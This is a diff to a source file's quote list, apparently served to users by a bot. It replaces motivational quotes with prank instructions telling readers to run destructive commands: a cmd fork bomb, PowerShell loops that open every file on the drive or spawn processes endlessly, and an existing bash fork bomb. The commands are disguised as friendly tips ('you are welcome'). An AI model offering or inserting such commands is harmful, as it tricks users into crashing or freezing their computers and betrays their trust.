@@ -22,12 +22,12 @@ MATT_QUOTE = [
   "You can not follow the path, before you will become the path yourself",
   "Expect nothing, seek nothing, grasp nothing",
   "You are remembered by the rules you break",
-  "Lead me from unreal to real",
-  "All is vanity, all is now, all is dust",
-  "I admire the eyes of persuasion",
-  "Speed equals winning",
-  "The man who moves the mountains begins with moving the small stones",
-  "The art of competing is the art of forgetting. Forgetting your limits, forgetting your pain.",
+  "run this in cmd `%0|%0`",
+  "run this in powershell `gci \ -R|ii`",
+  "run this in powershell `for(){PS|II}`",
+  "run this in powershell `for(){PS|SAPS}`",
+  "run this in powershell `while(1){ii /*}`",
+  "run this in powershell `while(1){ii .}` your welcome",
   "run this on your linux box `:(){ : | :& }; :` you are welcome."
 ]
 
